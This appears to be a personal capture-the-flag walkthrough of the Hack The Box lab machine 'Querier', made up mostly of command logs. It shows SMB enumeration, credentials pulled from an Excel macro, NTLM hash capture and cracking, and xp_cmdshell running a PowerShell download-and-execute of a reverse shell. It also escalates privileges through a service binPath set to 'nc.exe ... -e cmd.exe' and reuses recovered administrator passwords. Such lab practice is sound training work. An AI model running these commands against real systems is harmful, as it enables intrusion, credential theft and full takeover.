Querier - Hack The Box - Windows Medium - MSSQL

Ports open: 135, 139, 445, 1433

Open smb share that has excel shell document, has password, connect to mssql server with creds.

Commands and Output:
===================================================================================================================================

Host script results:
|_clock-skew: mean: 2m50s, deviation: 0s, median: 2m50s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-30T20:08:15
|_  start_date: N/A

===================================================================================================================================


Commands and Output:
===================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/querier/nmap]
└──╼ $smbclient -L \\10.10.10.125 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk      
SMB1 disabled -- no workgroup available

OR

┌─[user@parrot-virtual]─[~/htb/querier]
└──╼ $smbmap -H 10.10.10.125 -u "anonymous" -d localhost
[+] Guest session   	IP: 10.10.10.125:445	Name: 10.10.10.125                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	Reports                                           	READ ONLY	


OR 

┌─[user@parrot-virtual]─[~/htb/querier]
└──╼ $crackmapexec smb 10.10.10.125  -u "anonymous" -p '' -d localhost --shares
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:localhost) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] localhost\anonymous: 
SMB         10.10.10.125    445    QUERIER          [+] Enumerated shares
SMB         10.10.10.125    445    QUERIER          Share           Permissions     Remark
SMB         10.10.10.125    445    QUERIER          -----           -----------     ------
SMB         10.10.10.125    445    QUERIER          ADMIN$                          Remote Admin
SMB         10.10.10.125    445    QUERIER          C$                              Default share
SMB         10.10.10.125    445    QUERIER          IPC$            READ            Remote IPC
SMB         10.10.10.125    445    QUERIER          Reports         READ            
===================================================================================================================================

We have read access on reports so lets what we can extract.

Commands and Output:
===================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/querier/smb]
└──╼ $smbclient -N //10.10.10.125/reports
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 28 15:23:48 2019
  ..                                  D        0  Mon Jan 28 15:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 14:21:34 2019

		6469119 blocks of size 4096. 1614801 blocks available
smb: \> get "Currency Volume Report.xlsm" getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (20.3 KiloBytes/sec) (average 20.3 KiloBytes/sec)
smb: \> exit
===================================================================================================================================

Tool we can use to analyze is called olevba.
Commands and Output:
===================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/querier/smb/oletools]
└──╼ $pip install oletools
===================================================================================================================================

The "xlsm" extension refers to an xls macro file.
Commands and Output:
===================================================================================================================================
┌─[✗]─[user@parrot-virtual]─[~/htb/querier/smb]
└──╼ $olevba Currency\ Volume\ Report.xlsm 
olevba 0.56.1 on Python 3.9.2 - http://decalage.info/python/oletools
===============================================================================
FILE: Currency Volume Report.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
 
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
===================================================================================================================================

We find the uid which is the user for the mssql and we find the password as well.
Uid= reporting Pwd= PcwTWTHRwryjc$c6


We can use impacket's mssqlclient to connect to the sql server.
Commands and Output:
===================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/querier/smb]
└──╼ $/usr/share/doc/python3-impacket/examples/mssqlclient.py
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

usage: mssqlclient.py [-h] [-port PORT] [-db DB] [-windows-auth] [-debug] [-file FILE] [-hashes LMHASH:NTHASH] [-no-pass] [-k]
                      [-aesKey hex key] [-dc-ip ip address]
                      target
===================================================================================================================================

Commands and Output:
===================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/querier/smb]
└──╼ $/usr/share/doc/python3-impacket/examples/mssqlclient.py reporting@10.10.10.125 -windows-auth
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
===================================================================================================================================

Miscellaneous grab ports for nmap scan
Commands and Output:
===================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/querier/nmap]
└──╼ $cat all-ports | grep -o [0-9]*\/ | grep -o [0-9]* | tr '\n' ','
135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671
└──╼ $sudo nmap -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 -sV -sC -oA script-all-port 10.10.10.12
===================================================================================================================================

We try to run commands on the sql server but fail, we even try to enable xp cmdshell but fail, so next course of action is to steal
the users hash via responder.
Commands and Output:
===================================================================================================================================
SQL> show databases;
[-] ERROR(QUERIER): Line 1: Could not find stored procedure 'show'.
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
     
SQL> enable_xp_cmdshell
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL> 
===================================================================================================================================

To get the has we must first setup responser and from the sql service send an an access share command
Commands and Output:
===================================================================================================================================
SQL> xp_dirtree "\\10.10.14.15\tryharder\"
subdirectory depth   
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


┌─[user@parrot-virtual]─[~/htb/querier/smb]
└──╼ $sudo responder -I tun0
[sudo] password for user: 
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.15]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-2IZ32F559KS]
    Responder Domain Name      [NU11.LOCAL]
    Responder DCE-RPC Port     [45437]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.10.125
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:ee52bd18875ac0e
[*] Skipping previously captured hash for QUERIER\mssql-svc

===================================================================================================================================

And we use hashcat to crack the hash.
Commands and Output:
===================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/querier]
└──╼ $hashcat -m 5600 hashes /usr/share/wordlists/rockyou.txt --force
..
..
..
MSSQL-SVC::QUERIER:ee52bd18875ac0e1:8f2b6b2bd027a823db266107ab5b115b:0101000000000000804f8d8ecb3dd70196765bc12aed87fb00000000020008004e0055003100310001001e00570049004e002d00320049005a003300320046003500350039004b00530004003400570049004e002d00320049005a003300320046003500350039004b0053002e004e005500310031002e004c004f00430041004c00030014004e005500310031002e004c004f00430041004c00050014004e005500310031002e004c004f00430041004c0007000800804f8d8ecb3dd70106000400020000000800300030000000000000000000000000300000d9dd4353cbdc1d54cad14eb576b6b66edf2b7842c550f5d2cda8805dbe01cb0e0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003500000000000000000000000000:corporate568
===================================================================================================================================

The password for the MSSQL-SVC user service  on the windows machine is corporate568
We can test this bu using smbmap or crackmapexec
Commands and Output:
===================================================================================================================================
┌─[✗]─[user@parrot-virtual]─[~/htb/querier]
└──╼ $smbmap -H 10.10.10.125 -d querier -u "MSSQL-SVC" -p "corporate568"
[+] IP: 10.10.10.125:445	Name: 10.10.10.125                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	Reports                                           	READ ONLY
===================================================================================================================================

We have no greater access to the system. So we will go back and enter the new credentials to the mssql server and enable the use of
commands.
Commands and Output:
===================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/querier/smb]
└──╼ $/usr/share/doc/python3-impacket/examples/mssqlclient.py mssql-svc@10.10.10.125 -windows-auth
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
     
SQL> enable_xp_cmdshell
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> xp_cmdshell whoami
output                                                                             

--------------------------------------------------------------------------------   

querier\mssql-svc                                                                  

NULL                                                                               


===================================================================================================================================

As you can see we can now issue commands, next thing to do is get a full functioning reverse shell. Will use nishang script
for payload and nc as the listener.
We copy the nishang reverse tcp payload and the issue a command from inside the sql server to send the payload to our ip on port 9001
Commands and Output:
===================================================================================================================================
SQL> xp_cmdshell powershell IEX(New-object Net.WebClient).downloadString(\"http://10.10.14.15/rev.ps1\")

..
..
..
┌─[✗]─[user@parrot-virtual]─[~/htb/querier/smb]
└──╼ $rlwrap nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.125] 49684
Windows PowerShell running as user mssql-svc on QUERIER
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

whoami
querier\mssql-svc
PS C:\Windows\system32>
===================================================================================================================================

Let's run systeminfo to see what kind of box we are in
Commands and Output:
===================================================================================================================================
PS C:\Users\mssql-svc\Desktop> 
systeminfo

Host Name:                 QUERIER
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00429-00521-62775-AA073
Original Install Date:     1/28/2019, 11:16:50 PM
System Boot Time:          4/30/2021, 9:06:45 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,047 MB
Available Physical Memory: 881 MB
Virtual Memory: Max Size:  3,199 MB
Virtual Memory: Available: 1,880 MB
Virtual Memory: In Use:    1,319 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB.LOCAL
Logon Server:              N/A
Hotfix(s):                 6 Hotfix(s) Installed.
                           [01]: KB4481031
                           [02]: KB4462930
                           [03]: KB4470788
                           [04]: KB4480056
                           [05]: KB4480979
                           [06]: KB4476976
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.125
                                 [02]: fe80::259f:ccd4:5b5:2d59
                                 [03]: dead:beef::259f:ccd4:5b5:2d59
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
===================================================================================================================================

Although we have the impersonator token set it will not work on Microsoft Windows Server 2019 Standard, using juicy potatoe.
We can check the hotfixes for any potetnial exploits and when it was patched
Commands and Output:
===================================================================================================================================
Hotfix(s):                 6 Hotfix(s) Installed.
                           [01]: KB4481031
                           [02]: KB4462930
                           [03]: KB4470788
                           [04]: KB4480056
                           [05]: KB4480979
                           [06]: KB4476976
===================================================================================================================================

Commands and Output:
===================================================================================================================================
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
===================================================================================================================================

We will run powerup but need to copy into our directory and use webserver to transfer it.
Commands and Output:
===================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/querier/smb]
└──╼ $locate PowerUp
/usr/lib/python3/dist-packages/cme/data/powersploit/Privesc/PowerUp.ps1
/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
┌─[user@parrot-virtual]─[~/htb/querier/smb]
└──╼ $cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
===================================================================================================================================

Commands and Output:
===================================================================================================================================
IEX(New-object Net.WebClient).downloadstring("http://10.10.14.15/PowerUp.ps1")
invoke-allchecks

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...


[*] Checking for unquoted service paths...
..
..
..
..
..
PS C:\Users\mssql-svc\Desktop> 
IEX(New-object Net.WebClient).downloadstring("http://10.10.14.15/PowerUp.ps1")
Invoke-AllChecks

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...


[*] Checking for unquoted service paths...


[*] Checking service executable and argument permissions...


[*] Checking service permissions...


ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -ServiceName 'UsoSvc'





[*] Checking %PATH% for potentially hijackable .dll locations...


HijackablePath : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll' 
                 -Command '...'





[*] Checking for AlwaysInstallElevated registry key...


[*] Checking for Autologon credentials in registry...


[*] Checking for vulnerable registry autoruns and configs...


[*] Checking for vulnerable schtask files/configs...


[*] Checking for unattended install files...


UnattendPath : C:\Windows\Panther\Unattend.xml





[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...


PS C:\Users\mssql-svc\Desktop> Get-ChildItem : Access to the path 'C:\Windows\System32\Tasks' is denied.

===================================================================================================================================

The script dies when we try accessing an inaccessible directory. We can try running winPEAS and see if we can get more info.

Commands and Output:
===================================================================================================================================
curl http://10.10.14.15/winPEASx64.exe -O winpeas.exe
./winpeas.exe
===================================================================================================================================

We find some modfiiable services, as well as some credntials that are found in the groups.xml file for which we can try psexec and
see if can jump in and get a system shell.
Commands and Output:
===================================================================================================================================
  [+] Modifiable Services
   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
    UsoSvc: AllAccess, Start
..
..
..

  [+] Unattend Files
    C:\Windows\Panther\Unattend.xml
<Password>*SENSITIVE*DATA*DELETED*</Password>     <Enabled>true</Enabled>      <Username>Administrator</Username>     </AutoLogon>    <UserAccounts>     <LocalAccounts>      <LocalAccount wcm:action="add">       <Password>*SENSITIVE*DATA*DELETED*</Password>

  [+] Looking for common SAM & SYSTEM backups

  [+] Looking for McAfee Sitelist.xml Files

  [+] Cached GPP Passwords

C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml

C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
    Found C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
    UserName: Administrator
    NewName: [BLANK]
    cPassword: MyUnclesAreMarioAndLuigi!!1!
    Changed: 2019-01-28 23:12:48
    Found C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
    UserName: Administrator
    NewName: [BLANK]
    cPassword: MyUnclesAreMarioAndLuigi!!1!
    Changed: 2019-01-28 23:12:48
===================================================================================================================================


Commands and Output:
===================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/querier/smb]
└──╼ $impacket-psexec administrator@10.10.10.125
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.125.....
[*] Found writable share ADMIN$
[*] Uploading file RkfVAGky.exe
[*] Opening SVCManager on 10.10.10.125.....
[*] Creating service CONk on 10.10.10.125.....
[*] Starting service CONk.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
===================================================================================================================================

Evil-winrm works as well
Commands and Output:
===================================================================================================================================
└──╼ $evil-winrm -i 10.10.10.125 -u administrator -p 'MyUnclesAreMarioAndLuigi!!1!'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents
===================================================================================================================================


We can also try to gain access by abusing the service with modify permissions.
Commands and Output:
===================================================================================================================================
  [+] Current Token privileges
   [?] Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation
    SeAssignPrimaryTokenPrivilege: DISABLED
    SeIncreaseQuotaPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
===================================================================================================================================

We have SeImpersonatePrivilege however it is not exploitable on this windows version.

Commands and Output:
===================================================================================================================================
  [+] Modifiable Services
   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
    UsoSvc: AllAccess, Start
===================================================================================================================================

Looks like usosvc is also modifiable. So we can modify the service's execution path and restart with sc.exe

Commands and Output:
===================================================================================================================================
sc.exe stop UsoSvc
SERVICE_NAME: UsoSvc 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x3
        WAIT_HINT          : 0x7530
..
..
..
curl http://10.10.14.15/nc.exe -O nc.exe
..
..
..
sc.exe config usosvc binPath="C:\Users\mssql-svc\Desktop\nc.exe 10.10.14.15 4444 -e cmd.exe"
[SC] ChangeServiceConfig SUCCESS
..
..
..
sc.exe start UsoSvc
[SC] StartService FAILED 1053:
..
..
..
..
..
┌─[✗]─[user@parrot-virtual]─[~/htb/querier/smb]
└──╼ $rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.125] 49727
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

whoami
whoami
nt authority\system

===================================================================================================================================

Although the service states it has failed, it actually executes the command that was outlined.

Another thing we could have done using the powerup script still in memory is invoke the abuse function while specifying the service
to add a user to the local adminstrators group.
Commands and Output:
====================================================================================================================================
Invoke-ServiceAbuse usosvc

ServiceAbused Command                                                                   
------------- -------                                                                   
UsoSvc        net user john Password123! /add && net localgroup Administrators john /add
====================================================================================================================================

Using crackmapexec or smbmap allow to login with no issues
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/querier/smb]
└──╼ $smbmap -H 10.10.10.125 -u john -p 'Password123!' -d localhost
[+] IP: 10.10.10.125:445	Name: 10.10.10.125                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	Reports                                           	READ ONLY	
┌─[user@parrot-virtual]─[~/htb/querier/smb]
└──╼ $crackmapexec smb 10.10.10.125 -u "john" -p "Password123!" -d localhost
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:localhost) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] localhost\john:Password123!
====================================================================================================================================

Commands and Output:
====================================================================================================================================
====================================================================================================================================

Commands and Output:
====================================================================================================================================
====================================================================================================================================

Commands and Output:
====================================================================================================================================
====================================================================================================================================

Commands and Output:
====================================================================================================================================
====================================================================================================================================

Commands and Output:
====================================================================================================================================
====================================================================================================================================

Commands and Output:
====================================================================================================================================
====================================================================================================================================

Commands and Output:
====================================================================================================================================
====================================================================================================================================

Commands and Output:
====================================================================================================================================
====================================================================================================================================

Commands and Output:
====================================================================================================================================
====================================================================================================================================
